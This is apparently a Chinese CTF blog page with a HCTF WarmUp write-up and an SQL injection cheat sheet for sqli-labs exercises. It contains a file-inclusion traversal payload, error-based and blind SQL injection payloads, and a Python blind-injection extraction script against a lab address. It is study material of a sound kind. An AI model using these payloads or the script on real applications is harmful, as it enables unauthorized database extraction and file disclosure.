<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 5.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-CTF-Web-PHP代码审计" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/01/19/CTF-Web-PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="article-date">
  <time class="dt-published" datetime="2021-01-19T08:15:16.000Z" itemprop="datePublished">2021-01-19</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/01/19/CTF-Web-PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">CTF_Web PHP代码审计</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h1><p>地址：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[HCTF%202018]WarmUp">https://buuoj.cn/challenges#[HCTF%202018]WarmUp</a></p>
<p>思路：</p>
<p><strong>第一步</strong></p>
<p>进入界面，只有一个滑稽表情。</p>
<p>查看源码，提示访问source.php</p>
<p><strong>第二步</strong></p>
<p>访问source.php</p>
<p>得到源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment"># 白名单</span></span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="comment"># 若没有page或page不是字符串，退出</span></span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !is_string(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment"># 若page在白名单中，返回true。in_array为判断前者是否在后者中</span></span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment"># mb_substr(string, start, length)</span></span><br><span class="line">            <span class="comment"># mb_strpos(haystack, needle, offset, encoding) 查找needle在haystack中第一次出现的位置</span></span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="comment"># 再次判断白名单</span></span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);</span><br><span class="line">            <span class="comment"># 再次去除末尾？</span></span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span> <span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !is_string(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);</span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>审计后得知，还有一个hint.php</p>
<p><strong>第三步</strong></p>
<p>访问hint.php，提示flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag not here, and flag in ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
<p><strong>第四步</strong></p>
<p>回到source.php，只有提交的file变量满足checkFile的过滤条件时，才会执行关键语句</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include $_REQUEST[&#39;file&#39;];</span><br></pre></td></tr></table></figure>
<p>而include有一个技巧，即include “wrongname/flag.txt”时，由于添加了关键符号/，后面的flag.txt会被include函数解析，此时通过payload绕过验证即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file&#x3D;hint.php?&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
<p>此处注意，网上一些wp多余了步骤，将？进行了双重URL编码，其实大可不必，只要第一次检验？后返回true即可。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;9e564e10-3e8c-472d-a9fa-41b3d29adf50&#125; </span><br></pre></td></tr></table></figure>
<h2 id="include目录穿透"><a href="#include目录穿透" class="headerlink" title="include目录穿透"></a>include目录穿透</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">参考：https:&#x2F;&#x2F;blog.csdn.net&#x2F;stevenonesir&#x2F;article&#x2F;details&#x2F;109862380</span><br><span class="line">例如：include ‘wrongname&#x2F;flag.txt’</span><br><span class="line">wrongname无法被正确读取，这个时候&#x2F;后面的flag.txt就会被include函数读取并解析。</span><br></pre></td></tr></table></figure>
<h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><p>来源：极客大挑战2019</p>
<p>链接：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]PHP">https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]PHP</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/01/19/CTF-Web-PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" data-id="ckk3rwd020000x4us71x47qlj" data-title="CTF_Web PHP代码审计" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-SQL注入总结" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/01/15/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/" class="article-date">
  <time class="dt-published" datetime="2021-01-15T00:51:02.000Z" itemprop="datePublished">2021-01-15</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/01/15/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">SQL注入总结</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>主要是方便我自己查</p>
<h1 id="基本报错注入"><a href="#基本报错注入" class="headerlink" title="基本报错注入"></a>基本报错注入</h1><p>例题：sqllabs Less1、2、3、4</p>
<p>知识点：information_schema使用</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 爆数据库名</span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> group_concat(scheme_name) <span class="keyword">from</span> information_schema.schemata) <span class="comment">--+ </span></span><br><span class="line"># 爆表名</span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span>) <span class="comment">--+</span></span><br><span class="line"># 爆列名</span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>) <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<h1 id="XPath报错注入"><a href="#XPath报错注入" class="headerlink" title="XPath报错注入"></a>XPath报错注入</h1><p>例题：sqllabs less5、6</p>
<p>语句</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">其中payload为你要插入的SQL语句需要注意的是该语句将 输出字符长度限制为64个字符</span><br><span class="line"></span><br><span class="line">(1). 通过updatexml报错</span><br><span class="line">and updatexml(1,concat(&#39;~&#39;,payload),1) and &#39;1&#39;&#x3D;&#39;1 --+</span><br><span class="line"></span><br><span class="line">同样该语句对输出的字符长度也做了限制，其最长输出32位并且该语句对payload的返回类型也做了限制，只有在payload返回的不是xml格式才会生效</span><br><span class="line"></span><br><span class="line">(2). 通过ExtractValue报错</span><br><span class="line">and extractvalue(1,concat(0x26,payload,0x26)) and &#39;1&#39;&#x3D;&#39;1 --+</span><br><span class="line"></span><br><span class="line">输出字符有长度限制，最长32位。</span><br><span class="line"></span><br><span class="line">然后就构造payload</span><br></pre></td></tr></table></figure>
<h1 id="双查询注入（floor）"><a href="#双查询注入（floor）" class="headerlink" title="双查询注入（floor）"></a>双查询注入（floor）</h1><p>例题：less5</p>
<p>原理：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过floor报错的方法来爆数据的本质是group by语句的报错。group by语句报错的原因是floor(random(0)*2)的不确定性，即可能为0也可能为1（group by key的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中则更新临时表中的数据；如果该key不存在于临时表中，则在临时表中插入key所在行的数据。group by floor(random(0)*2)出错的原因是key是个随机数，检测临时表中key是否存在时计算了一下floor(random(0)*2)可能为0，如果此时临时表只有key为1的行不存在key为0的行，那么数据库要将该条记录插入临时表，由于是随机数，插时又要计算一下随机值，此时floor(random(0)*2)结果可能为1，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值。</span><br></pre></td></tr></table></figure>
<p>语句格式：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#注意payload要有括号</span><br><span class="line">?id&#x3D;-1&#39; union select 1,count(*),concat( (payload),floor(rand(0)*2)  ) as a from information_schema.tables group by a --+</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 爆数据库名</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,count(*),concat( (select database()),floor(rand(0)*2)  ) as a from information_schema.tables group by a --+</span></span><br><span class="line"><span class="string"># 爆表名，注意表名过多，所以要逐个爆 limit i,1</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="built_in">count</span>(<span class="operator">*</span>),concat( (<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>)  ) <span class="keyword">as</span> a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a <span class="comment">--+</span></span><br><span class="line"># 爆列名</span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,count(*),concat( (select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; limit 0,1),floor(rand(0)*2)  ) as a from information_schema.tables group by a --+</span></span><br></pre></td></tr></table></figure>
<h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><p>例题：less8</p>
<p>适用场景：不返回报错信息，但是根据sql语句正确性会有不同的回显</p>
<p>脚本模板</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 此脚本为返回数据库名，替换database()处即可</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://192.168.64.2/sqllabs/Less-8?id=1&#x27; and %s--+&quot;</span></span><br><span class="line"></span><br><span class="line">ans = <span class="string">&quot;&quot;</span></span><br><span class="line">success_text = <span class="string">&quot;You are in...........&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">	flag = <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">127</span>):</span><br><span class="line">		c = <span class="built_in">chr</span>(j)</span><br><span class="line">		s = <span class="string">&quot;substr(database(),&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;,1)=&#x27;&quot;</span> + c + <span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">		response = requests.get(url%s)</span><br><span class="line">		print(url%s)</span><br><span class="line">		<span class="keyword">if</span> success_text <span class="keyword">in</span> response.text:</span><br><span class="line">			flag = <span class="number">1</span></span><br><span class="line">			ans = ans + c</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">if</span> flag == <span class="number">0</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">print(ans)</span><br></pre></td></tr></table></figure>




<h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><p>例题：less9、10</p>
<p>适用情况：能执行sleep()函数</p>
<p>判断：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> ?id&#x3D;1&#39; and sleep(5) --+</span><br><span class="line">延时大概5秒，说明可以采用时间盲注</span><br></pre></td></tr></table></figure>
<p>语句：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.64.2&#x2F;sqli&#x2F;Less-9&#x2F;?id&#x3D;1&#39; and if(length(database())&#x3D;7,sleep(5),1)%20--+</span><br><span class="line">有延迟，说明数据库名称长度为8</span><br></pre></td></tr></table></figure>


<h1 id="sqllab题目"><a href="#sqllab题目" class="headerlink" title="sqllab题目"></a>sqllab题目</h1><h2 id="Less5"><a href="#Less5" class="headerlink" title="Less5"></a>Less5</h2><p>做法1：count()和floor()的查询注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 爆数据库名</span><br><span class="line">?id&#x3D;-1&#39; union select 1,count(*),concat( (select database()),floor(rand(0)*2)  ) as a from information_schema.tables group by a --+</span><br><span class="line"># 爆表名，注意表名过多，所以要逐个爆 limit i,1</span><br><span class="line">?id&#x3D;-1&#39; union select 1,count(*),concat( (select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 0,1),floor(rand(0)*2)  ) as a from information_schema.tables group by a --+</span><br><span class="line"># 爆列名</span><br><span class="line">id&#x3D;-1&#39; union select 1,count(*),concat( (select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 0,1),floor(rand(0)*2)  ) as a from information_schema.tables group by a --+</span><br></pre></td></tr></table></figure>
<p>做法2：updatexml()</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 爆数据库名</span><br><span class="line">?id&#x3D;-1&#39; and updatexml(1,concat(&#39;~&#39;,database()),1) --+</span><br><span class="line">后面把payload替换一下</span><br></pre></td></tr></table></figure>
<h2 id="Less6"><a href="#Less6" class="headerlink" title="Less6"></a>Less6</h2><p>与Less5相同，Less5为单引号，本题为双引号</p>
<h2 id="Less7"><a href="#Less7" class="headerlink" title="Less7"></a>Less7</h2><p>跳过 ，环境有问题</p>
<h2 id="Less8"><a href="#Less8" class="headerlink" title="Less8"></a>Less8</h2><p>考察：布尔盲注</p>
<p>不返回报错信息，但是根据sql语句正确性会有不同的回显</p>
<p>以下脚本，注意数据库逐位判断处为一个等号</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://192.168.64.2/sqllabs/Less-8?id=1&#x27; and %s--+&quot;</span></span><br><span class="line"></span><br><span class="line">ans = <span class="string">&quot;&quot;</span></span><br><span class="line">success_text = <span class="string">&quot;You are in...........&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">	flag = <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">127</span>):</span><br><span class="line">		c = <span class="built_in">chr</span>(j)</span><br><span class="line">		s = <span class="string">&quot;substr(database(),&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;,1)=&#x27;&quot;</span> + c + <span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">		response = requests.get(url%s)</span><br><span class="line">		print(url%s)</span><br><span class="line">		<span class="keyword">if</span> success_text <span class="keyword">in</span> response.text:</span><br><span class="line">			flag = <span class="number">1</span></span><br><span class="line">			ans = ans + c</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">if</span> flag == <span class="number">0</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">print(ans)</span><br></pre></td></tr></table></figure>
<h2 id="Less9"><a href="#Less9" class="headerlink" title="Less9"></a>Less9</h2><p>考察：时间盲注</p>
